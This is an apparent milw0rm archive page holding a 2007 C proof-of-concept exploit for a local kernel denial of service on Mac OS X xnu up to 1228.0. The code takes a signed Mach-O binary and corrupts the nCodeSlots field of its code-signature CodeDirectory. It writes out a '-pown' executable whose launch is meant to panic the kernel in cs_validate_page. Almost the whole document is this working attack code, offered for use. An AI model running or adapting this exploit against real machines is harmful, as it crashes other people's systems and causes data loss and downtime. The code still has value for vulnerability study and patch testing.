<html><head><title>Apple Mac OS X xnu <= 1228.0 Local kernel Denial of Service PoC</title></head><pre>/* xnu-superblob-dos.c
 *
 * Copyright (c) 2007 by &lt;mu-b@digit-labs.org&gt;
 *
 * Apple MACOS X xnu &lt;= 1228.0 local kernel DoS POC
 * by mu-b - Mon 10 Dec 2007
 *
 * - Tested on: Apple MACOS X 10.5.1 (xnu-1228.0.2~1/RELEASE_I386)
 *
 * assert trip or bcopy (NULL, ....) in cs_validate_page by causing
 * hashes () to return NULL (there are many ways to do this!).
 *                                       (bsd/kern/ubc_subr.c)
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#include &lt;arpa/inet.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;

#define MAX_PATH_LEN                128

/* change this value if no panic */
#define CSLOTS_DIFF                 0x69696969

#define CSSLOT_CODEDIRECTORY        0x0
#define CSMAGIC_CODEDIRECTORY       0xfade0c02  /* CodeDirectory blob */
#define CSMAGIC_EMBEDDED_SIGNATURE  0xfade0cc0  /* embedded form of signature data */

/* bsd/kern/ubc_subr.c */
struct blob_index {
  unsigned int type;
  unsigned int offset;
};

struct super_blob {
  unsigned int magic;
  unsigned int length;
  unsigned int count;
  struct blob_index index[];
};

struct code_directory {
  unsigned int magic;
  unsigned int length;
  unsigned int version;
  unsigned int flags;
  unsigned int hashOffset;
  unsigned int identOffset;
  unsigned int nSpecialSlots;
  unsigned int nCodeSlots;      /* number of ordinary (code) hash slots */
  unsigned int codeLimit;
  unsigned char hashSize;
  unsigned char hashType;
  unsigned char spare1;
  unsigned char pageSize;
  unsigned int spare2;
};

static void *
xmalloc (int num_bytes)
{
  char *buf;

  buf = malloc (num_bytes);
  if (buf == NULL)
    {
      fprintf (stderr, &quot;malloc (): out of memory allocating %d-bytes!\n&quot;, num_bytes);
      exit (EXIT_FAILURE);
    }

  return (buf);
}

int
main (int argc, char ** argv)
{
  char fnbuf[MAX_PATH_LEN], *ptr, *cur, *end;
  int fd, wfd, found, size;
  struct stat fbuf;

  printf (&quot;Apple MACOS X xnu &lt;= 1228.0 local kernel DoS PoC\n&quot;
          &quot;by: &lt;mu-b@digit-labs.org&gt;\n&quot;
          &quot;http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n&quot;);

  if (argc &lt;= 1)
    {
      fprintf (stderr, &quot;Usage: %s &lt;signed macho-o binary&gt;\n&quot;, argv[0]);
      exit (EXIT_SUCCESS);
    }

  if ((fd = open (argv[1], O_RDONLY)) == -1)
    {
      perror (&quot;open ()&quot;);
      exit (EXIT_FAILURE);
    }

  snprintf (fnbuf, sizeof fnbuf, &quot;%s-pown&quot;, argv[1]);

  if ((wfd = open (fnbuf, O_RDWR | O_CREAT)) == -1)
    {
      perror (&quot;open ()&quot;);
      exit (EXIT_FAILURE);
    }

  if (fstat (fd, &amp;fbuf) &lt; 0)
    {
      perror (&quot;fstat ()&quot;);
      exit (EXIT_FAILURE);
    }

  size = fbuf.st_size;
  ptr = xmalloc (sizeof (char) * size);
  end = ptr + size;

  if (read (fd, ptr, size) &lt; size)
    {
      unlink (fnbuf);

      perror (&quot;write ()&quot;);
      exit (EXIT_FAILURE);
    }

  close (fd);

  for (cur = ptr, found = 0;
       cur + sizeof (struct super_blob) &lt; end;
       cur += sizeof (unsigned long))
    {
      struct super_blob *blob;
      int i, magic;

      blob = (struct super_blob *) cur;
      magic = ntohl (blob-&gt;magic);

      if (magic == CSMAGIC_EMBEDDED_SIGNATURE)
        {
          for (i = 0; i &lt; ntohl (blob-&gt;count); i++)
            {
              int type;
              
              type = ntohl (blob-&gt;index[i].type);
              if (type == CSSLOT_CODEDIRECTORY)
                {
                  struct code_directory *code;
                  int offset;
                  
                  offset = ntohl (blob-&gt;index[i].offset);
                  code = (struct code_directory *) (cur + offset);
                  magic = ntohl (code-&gt;magic);
                  
                  if (magic == CSMAGIC_CODEDIRECTORY);
                    {
                      printf (&quot;* found at offset @0x%08X\n&quot;, (char *) code - ptr);
                      code-&gt;nCodeSlots = htonl (CSLOTS_DIFF);
                      found = 1;
                    }
                }
            }
        }
    }

  if (!found)
    {
      unlink (fnbuf);

      fprintf (stderr, &quot;* ARGH! hueristic didn't find our target!\n&quot;);
      exit (EXIT_FAILURE);
    }

  write (wfd, ptr, size);
  fchmod(wfd, fbuf.st_mode);
  close (wfd);

  free (ptr);
  fprintf (stdout, &quot;* done\nexecute ./%s at your own risk!$%%!\n&quot;, fnbuf);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2007-12-12]</pre></html>